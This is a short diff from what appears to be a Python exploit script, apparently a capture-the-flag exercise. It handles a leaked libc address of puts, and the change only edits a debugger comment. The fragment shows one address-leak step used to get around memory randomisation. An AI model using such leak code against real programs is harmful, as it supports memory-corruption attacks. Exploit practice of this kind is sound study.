@@ -68,7 +68,7 @@ leak = leak[::-1]  # reverse byte order for printing.
 leak = leak[1:]  # slice off line-feed (0xa).
 
 # e.g. leak: b'7ffff7e4be10
-# x/i 0x7ffff7e4be10
+# gdb> x/i 0x7ffff7e4be10
 # 0x7ffff7e4be10 <__GI__IO_puts>:      push   r14
 
 print("puts leak:", binascii.b2a_hex(leak), end="")
